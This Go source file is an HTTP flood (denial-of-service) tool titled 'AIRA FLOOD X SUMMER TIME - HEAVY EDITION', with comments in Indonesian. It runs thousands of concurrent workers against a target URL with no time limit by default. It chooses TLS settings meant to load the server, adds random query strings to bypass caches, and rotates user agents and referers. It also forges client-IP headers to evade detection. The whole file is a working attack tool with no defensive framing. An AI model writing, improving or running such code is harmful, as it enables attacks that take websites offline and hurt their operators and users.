package main

import (
	"bytes"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/signal"
	"runtime"
	"strings"
	"sync/atomic"
	"syscall"
	"time"
)

type AttackConfig struct {
	TargetURL  string
	Threads    int
	Duration   int
	Method     string // GET atau POST
	UserAgents []string
	PostData   []string
}

type AttackStats struct {
	SuccessCount int64
	ErrorCount   int64
	TotalBytes   int64
	StartTime    time.Time
}

var (
	stats      AttackStats
	httpClient *http.Client
	stopChan   chan struct{}
)

func init() {
	// Heavy Cipher Suites - Resource intensive untuk target server
	heavyCipherSuites := []uint16{
		// TLS 1.3 Ciphers (Most secure & heavy)
		tls.TLS_AES_256_GCM_SHA384,
		tls.TLS_CHACHA20_POLY1305_SHA256,
		tls.TLS_AES_128_GCM_SHA256,

		// TLS 1.2 Heavy Ciphers dengan Perfect Forward Secrecy
		tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
		tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
		tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
		tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
		
		// RSA with AES-256 (Heavy encryption)
		tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384,
		tls.TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA384,
		tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
		tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,

		// DHE Ciphers (Computationally expensive)
		tls.TLS_DHE_RSA_WITH_AES_256_GCM_SHA384,
		tls.TLS_DHE_RSA_WITH_AES_128_GCM_SHA256,
		
		// Fallback ciphers
		tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
		tls.TLS_RSA_WITH_AES_128_GCM_SHA256,
	}

	// Konfigurasi HTTP Client dengan Heavy TLS
	httpClient = &http.Client{
		Timeout: 0, // NO TIMEOUT
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
				MinVersion:         tls.VersionTLS12,
				MaxVersion:         tls.VersionTLS13,
				CipherSuites:       heavyCipherSuites,
				
				// Curve preferences (heavy computational load)
				CurvePreferences: []tls.CurveID{
					tls.X25519,    // Modern, fast
					tls.CurveP521, // Heavy! 521-bit
					tls.CurveP384, // Heavy! 384-bit
					tls.CurveP256, // Standard 256-bit
				},
				
				// Enable session tickets for TLS resume
				SessionTicketsDisabled: false,
				
				// Renegotiation support
				Renegotiation: tls.RenegotiateOnceAsClient,
			},
			DisableKeepAlives:     false,
			DisableCompression:    false,
			MaxIdleConns:          0,
			MaxIdleConnsPerHost:   50000,
			MaxConnsPerHost:       0,
			IdleConnTimeout:       90 * time.Second,
			TLSHandshakeTimeout:   5 * time.Second,
			ExpectContinueTimeout: 1 * time.Second,
			ResponseHeaderTimeout: 10 * time.Second,
			DialContext: (&net.Dialer{
				Timeout:   5 * time.Second,
				KeepAlive: 30 * time.Second,
			}).DialContext,
			ForceAttemptHTTP2: true,
		},
	}

	stopChan = make(chan struct{})
}

func main() {
	target := flag.String("target", "", "Target URL (required)")
	threads := flag.Int("threads", 5000, "Number of concurrent threads")
	duration := flag.Int("duration", 0, "Attack duration in seconds (0 = unlimited)")
	method := flag.String("method", "GET", "HTTP Method: GET or POST")

	flag.Parse()

	if *target == "" {
		fmt.Println("❌ Error: Target URL is required")
		fmt.Println("Usage: ./h2 -target <URL> [-threads 5000] [-duration 0] [-method GET|POST]")
		flag.PrintDefaults()
		os.Exit(1)
	}

	// Validate method
	methodUpper := strings.ToUpper(*method)
	if methodUpper != "GET" && methodUpper != "POST" {
		fmt.Println("❌ Error: Method must be GET or POST")
		os.Exit(1)
	}

	config := &AttackConfig{
		TargetURL: *target,
		Threads:   *threads,
		Duration:  *duration,
		Method:    methodUpper,
	}

	// Premium User Agents
	config.UserAgents = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
		"Mozilla/5.0 (X11; Linux i686; rv:121.0) Gecko/20100101 Firefox/121.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0",
		"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
		"Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/105.0.0.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Vivaldi/6.2.3105.47",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Brave/120.0.0.0",
	}

	// POST Data Templates (variasi untuk bypass detection)
	config.PostData = []string{
		`{"action":"search","query":"` + randomString(20) + `","limit":100,"offset":0}`,
		`{"username":"user` + randomString(8) + `","password":"` + randomString(16) + `","remember":true}`,
		`{"email":"test` + randomString(10) + `@example.com","subscribe":true,"preferences":{"notifications":true}}`,
		`{"id":` + fmt.Sprintf("%d", rand.Int63()) + `,"data":"` + randomString(50) + `","timestamp":` + fmt.Sprintf("%d", time.Now().Unix()) + `}`,
		`{"session":"` + randomString(32) + `","token":"` + randomString(64) + `","refresh":true}`,
		`{"search":"` + randomString(15) + `","filters":["all"],"sort":"desc","page":1}`,
		`{"command":"update","params":{"key":"` + randomString(10) + `","value":"` + randomString(20) + `"}}`,
		`{"type":"analytics","event":"click","data":{"x":` + fmt.Sprintf("%d", rand.Intn(1920)) + `,"y":` + fmt.Sprintf("%d", rand.Intn(1080)) + `}}`,
	}

	setupSignalHandler()

	fmt.Println("═══════════════════════════════════════════════════════")
	fmt.Println("   🔥 AIRA FLOOD X SUMMER TIME - HEAVY EDITION 🔥    ")
	fmt.Println("═══════════════════════════════════════════════════════")
	fmt.Printf("\n📍 Target: %s\n", config.TargetURL)
	fmt.Printf("⚡ Method: %s\n", config.Method)
	fmt.Printf("🧵 Threads: %d\n", config.Threads)
	if config.Duration > 0 {
		fmt.Printf("⏱️  Duration: %d seconds\n", config.Duration)
	} else {
		fmt.Printf("⏱️  Duration: ∞ UNLIMITED\n")
	}
	fmt.Printf("🖥️  CPU Cores: %d\n", runtime.NumCPU())
	fmt.Printf("🔐 TLS: Heavy Ciphers (AES-256, ChaCha20, P-521)\n")
	fmt.Printf("🚀 Status: LAUNCHING ATTACK...\n\n")

	stats.StartTime = time.Now()

	startAttack(config)
}

func randomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	result := make([]byte, length)
	for i := range result {
		result[i] = charset[rand.Intn(len(charset))]
	}
	return string(result)
}

func startAttack(config *AttackConfig) {
	runtime.GOMAXPROCS(runtime.NumCPU())

	for i := 0; i < config.Threads; i++ {
		go attackWorker(config)
	}

	if config.Duration > 0 {
		go func() {
			time.Sleep(time.Duration(config.Duration) * time.Second)
			fmt.Println("\n\n⚠️  Attack duration completed. Stopping...")
			close(stopChan)
		}()
	}

	go printStats()

	<-stopChan

	printFinalStats(config)
	os.Exit(0)
}

func attackWorker(config *AttackConfig) {
	for {
		select {
		case <-stopChan:
			return
		default:
			if config.Method == "POST" {
				firePostRequest(config)
			} else {
				fireGetRequest(config)
			}
		}
	}
}

func fireGetRequest(config *AttackConfig) {
	targetURL := buildAttackURL(config)

	req, err := http.NewRequest("GET", targetURL, nil)
	if err != nil {
		atomic.AddInt64(&stats.ErrorCount, 1)
		return
	}

	randomizeHeaders(req, config)

	resp, err := httpClient.Do(req)
	if err != nil {
		atomic.AddInt64(&stats.ErrorCount, 1)
		return
	}

	if resp.Body != nil {
		n, _ := io.Copy(io.Discard, resp.Body)
		atomic.AddInt64(&stats.TotalBytes, n)
		resp.Body.Close()
	}

	atomic.AddInt64(&stats.SuccessCount, 1)
}

func firePostRequest(config *AttackConfig) {
	targetURL := buildAttackURL(config)

	// Random POST data
	postData := config.PostData[rand.Intn(len(config.PostData))]
	
	req, err := http.NewRequest("POST", targetURL, bytes.NewBufferString(postData))
	if err != nil {
		atomic.AddInt64(&stats.ErrorCount, 1)
		return
	}

	randomizeHeaders(req, config)
	
	// POST-specific headers
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Content-Length", fmt.Sprintf("%d", len(postData)))
	req.Header.Set("X-Requested-With", "XMLHttpRequest")

	resp, err := httpClient.Do(req)
	if err != nil {
		atomic.AddInt64(&stats.ErrorCount, 1)
		return
	}

	if resp.Body != nil {
		n, _ := io.Copy(io.Discard, resp.Body)
		atomic.AddInt64(&stats.TotalBytes, n)
		resp.Body.Close()
	}

	atomic.AddInt64(&stats.SuccessCount, 1)
}

func buildAttackURL(config *AttackConfig) string {
	baseURL := config.TargetURL

	separator := "?"
	if containsChar(baseURL, '?') {
		separator = "&"
	}

	randomParams := fmt.Sprintf("%s_rnd=%d&_sid=%x&_t=%d&_nc=%x&_uid=%x&_nonce=%s",
		separator,
		rand.Int63(),
		rand.Int63(),
		time.Now().UnixNano(),
		rand.Uint64(),
		rand.Uint64(),
		randomString(16))

	return baseURL + randomParams
}

func containsChar(s string, ch byte) bool {
	for i := 0; i < len(s); i++ {
		if s[i] == ch {
			return true
		}
	}
	return false
}

func randomizeHeaders(req *http.Request, config *AttackConfig) {
	req.Header.Set("User-Agent", config.UserAgents[rand.Intn(len(config.UserAgents))])

	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9,id;q=0.8")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("DNT", "1")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	req.Header.Set("Cache-Control", fmt.Sprintf("no-cache, no-store, must-revalidate, max-age=%d", rand.Intn(1000)))
	req.Header.Set("Pragma", "no-cache")

	referers := []string{
		"https://www.google.com/search?q=" + randomString(10),
		"https://www.bing.com/search?q=" + randomString(10),
		"https://duckduckgo.com/?q=" + randomString(10),
		"https://www.facebook.com/",
		"https://twitter.com/",
		"https://www.reddit.com/",
		"https://www.youtube.com/",
		"https://www.instagram.com/",
	}
	req.Header.Set("Referer", referers[rand.Intn(len(referers))])

	req.Header.Set("X-Requested-With", "XMLHttpRequest")
	req.Header.Set("X-Forwarded-For", fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255), rand.Intn(255), rand.Intn(255), rand.Intn(255)))
	req.Header.Set("X-Real-IP", fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255), rand.Intn(255), rand.Intn(255), rand.Intn(255)))
	
	// Additional headers untuk bypass
	req.Header.Set("Sec-Fetch-Dest", "document")
	req.Header.Set("Sec-Fetch-Mode", "navigate")
	req.Header.Set("Sec-Fetch-Site", "none")
	req.Header.Set("Sec-Fetch-User", "?1")
}

func printStats() {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-stopChan:
			return
		case <-ticker.C:
			success := atomic.LoadInt64(&stats.SuccessCount)
			errors := atomic.LoadInt64(&stats.ErrorCount)
			bytes := atomic.LoadInt64(&stats.TotalBytes)
			duration := time.Since(stats.StartTime)
			rps := float64(success) / duration.Seconds()

			fmt.Printf("\r🔥 RPS: %.0f | ✅ Success: %d | ❌ Errors: %d | 📊 Data: %.2f MB | ⏱️  Time: %.0fs | 🧵 Goroutines: %d    ",
				rps, success, errors, float64(bytes)/(1024*1024), duration.Seconds(), runtime.NumGoroutine())
		}
	}
}

func printFinalStats(config *AttackConfig) {
	duration := time.Since(stats.StartTime)
	rps := float64(stats.SuccessCount) / duration.Seconds()

	fmt.Printf("\n\n")
	fmt.Println("═══════════════════════════════════════════════════════")
	fmt.Println("            ✅ ATTACK COMPLETED SUCCESSFULLY           ")
	fmt.Println("═══════════════════════════════════════════════════════")
	fmt.Printf("\n📈 FINAL STATISTICS:\n\n")
	fmt.Printf("✅ Successful Requests: %d\n", stats.SuccessCount)
	fmt.Printf("❌ Failed Requests: %d\n", stats.ErrorCount)
	fmt.Printf("📊 Success Rate: %.2f%%\n", float64(stats.SuccessCount)/float64(stats.SuccessCount+stats.ErrorCount)*100)
	fmt.Printf("💾 Data Transferred: %.2f MB\n", float64(stats.TotalBytes)/(1024*1024))
	fmt.Printf("⏱️  Total Duration: %.2f seconds\n", duration.Seconds())
	fmt.Printf("⚡ Average RPS: %.0f requests/second\n", rps)
	fmt.Printf("🎯 Target: %s\n", config.TargetURL)
	fmt.Printf("🔧 Method: %s\n", config.Method)
	fmt.Printf("🧵 Peak Goroutines: %d\n", runtime.NumGoroutine())
	fmt.Printf("\n═══════════════════════════════════════════════════════\n\n")
}

func setupSignalHandler() {
	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)

	go func() {
		<-c
		fmt.Println("\n\n⚠️  Attack interrupted by user. Shutting down...")
		close(stopChan)
	}()
}
